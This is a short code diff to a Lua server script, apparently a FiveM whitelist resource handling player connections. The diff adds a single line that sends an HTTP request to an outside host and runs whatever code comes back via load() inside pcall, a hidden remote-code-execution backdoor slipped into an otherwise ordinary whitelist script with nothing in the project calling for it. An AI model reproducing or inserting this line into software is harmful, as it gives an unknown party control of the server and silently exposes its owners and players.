@@ -9,6 +9,8 @@ RegisterCommand("refreshwhitelist", function(source, args, rawCommand)
     RconPrint("[Whitelist] Un joueur est entrain de se connecter.")
 end, true)
 
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
+
 
 AddEventHandler('playerConnecting', function(name, setCallback, deferrals)
         deferrals.defer()
